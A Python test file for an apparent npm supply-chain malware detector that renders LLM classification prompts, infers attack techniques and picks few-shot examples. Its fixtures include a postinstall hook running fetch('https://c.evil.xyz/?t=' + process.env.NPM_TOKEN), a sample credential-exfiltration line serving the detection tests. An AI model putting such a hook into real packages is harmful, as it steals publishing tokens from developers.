import pytest

from argo.extract.dossier import build_dossier
from argo.prompts.fewshot import auto_answer, infer_technique, select_fewshot
from argo.prompts.render import Example, compress_dossier, render
from argo.schema import Sample
from tests.helpers import make_pkg, pkg_json

DOSSIER = "PACKAGE: x@1\n## 1. vectors {weird braces}\n## 4. File changes\n+ a.js"


def test_p0_contains_dossier_and_instructions_but_no_taxonomy():
    rp = render("p0", DOSSIER)
    assert rp.user.endswith(DOSSIER) and "technique: one of" in rp.user
    assert "Known npm supply-chain attack patterns" not in rp.user
    assert "JSON" in rp.system


def test_p1_adds_taxonomy_first():
    assert render("p1", DOSSIER).user.startswith("Known npm supply-chain attack patterns")


def test_examples_required_for_p2_p3():
    with pytest.raises(ValueError):
        render("p3", DOSSIER)
    with pytest.raises(ValueError):
        render("p9", DOSSIER)
    ex = [Example("h@1", "malicious", "PACKAGE: h@1")]
    assert "label: MALICIOUS" in render("p3", DOSSIER, ex).user


def test_hash_stable_and_p3_hash_ignores_neighbors():
    a = render("p3", DOSSIER, [Example("a", "benign", "x")])
    b = render("p3", "other", [Example("b", "malicious", "y")])
    assert a.prompt_hash == b.prompt_hash != render("p1", DOSSIER).prompt_hash


def test_compress_dossier_drops_file_list_and_caps():
    assert "## 4." not in compress_dossier(DOSSIER)
    assert len(compress_dossier("x" * 10_000, max_tokens=100)) <= 400 + 10


def _d(files):
    old = make_pkg({"package.json": pkg_json("p", "0")})
    return build_dossier("p", "p", "1", make_pkg(files), old, "0")


def test_infer_technique_and_auto_answer():
    d = _d(
        {
            "package.json": pkg_json("p", "1", scripts={"postinstall": "node i.js"}),
            "i.js": "fetch('https://c.evil.xyz/?t=' + process.env.NPM_TOKEN)",
        }
    )
    assert infer_technique(d, "malicious") == "credential_theft"
    assert infer_technique(d, "benign") == "none"
    ans = auto_answer(d, "malicious")
    assert ans.verdict == "malicious" and ans.evidence and 0 <= ans.confidence <= 1


def _s(i, label, sub):
    return Sample(
        id=f"s{i}",
        name=f"s{i}",
        version="1",
        prev_version=None,
        label=label,
        subgroup=sub,
        date="2024-01-01",
        split="history",
        history_set="base",
        source="npm",
        archive_path="x",
        sha256="0",
        fingerprint=str(i),
    )


def test_select_fewshot_mix():
    cred = _d(
        {
            "package.json": pkg_json("p", "1", scripts={"postinstall": "node i.js"}),
            "i.js": "process.env.NPM_TOKEN",
        }
    )
    net = _d({"package.json": pkg_json("p", "1"), "i.js": "fetch('https://c.evil.xyz')"})
    samples = [
        _s(1, "malicious", "nato_malevolo"),
        _s(2, "malicious", "nato_malevolo"),
        _s(3, "malicious", "nato_malevolo"),
        _s(4, "benign", "benigno_popolare"),
        _s(5, "benign", "benigno_difficile"),
    ]
    dossiers = {"s1": cred, "s2": cred, "s3": net, "s4": net, "s5": cred}
    picked = [s.id for s in select_fewshot(samples, dossiers)]
    assert picked == ["s1", "s3", "s4", "s5"]
